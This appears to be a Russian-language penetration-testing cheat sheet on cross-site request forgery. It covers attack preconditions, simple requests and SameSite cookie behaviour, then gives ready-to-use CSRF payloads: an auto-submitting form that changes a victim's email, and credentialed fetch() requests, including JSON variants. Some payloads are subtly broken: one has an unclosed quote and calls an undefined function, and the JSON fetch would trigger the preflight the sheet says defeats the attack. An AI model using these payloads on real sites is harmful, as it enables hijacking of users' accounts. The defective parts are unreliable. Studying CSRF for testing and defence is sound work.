## Условия для CSRF атаки  
1) Домен не использует anti-CSRF токены или SameSite cookie.  
2) Метод поддерживается браузером без Preflight запросов. Если метод, заголовки или content-type нестандартные (не simple request) - отправляется preflight запрос.
3) Браузер автоматически добавляет куки.
4) Внешний сайт с эксплоитом или On-Site Request Forgery.
5) 

**Simple Request**:
1) GET, POST
2) Content-Type: text/plain, application/x-www-form-urlencoded, multipart/form-data
3) Для данного типа запроса можно вручную установить такие заголовки:
   ```
   Accept
   Accept-Language
   Content-Language
   Content-Type
   Range
   ```


## SameSite Cookie  
 - Lax: куки отправляются для запросов GET, HEAD, OPTIONS в top-level навигации. Куки НЕ отправляются при кросс-доменных POST запросах. Не отправляется для fetch() и XHR().  
 - Strict: куки отправляются только с того сайта для которого установлен файл куки.

## Payloads

**FORM POST**:
```
<html>    
<body>
<form action="https://vulnerable-website.com/email/change" method="POST">
<input type="hidden" name="email" value="pwned@evil-user.net" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

**FETCH() / XHR(), Simple request, SameSite=None**:  
```
fetch('https://vulnerable-domain.com',{
method: "POST",
credentials: "include",
headers: {"Content-type": "text/plain"},
body: "var1=a&var2=b"
});
```

**JSON-based CSRF FORM POST**:
```
<html>    
<body onload='document.forms[0].submit()>
  <form method='POST' enctype='text/plain'>
    <input name='{"secret": 1337, "trash": "' value='"}'>
  </form>
</body>
<script>
  $("form").submit(function(event) {
    event.preventDefault();
    submitAsJSON(this);
  });
</script>
</html>
```

**JSON-based CSRF FETCH()**:
```
fetch('https://vulnerable-domain.com',{
method: "POST",
credentials: "include",
headers: {"Content-type": "application/json"},
body: JSON.stringify({var1:1, var2:"2"})
});
```
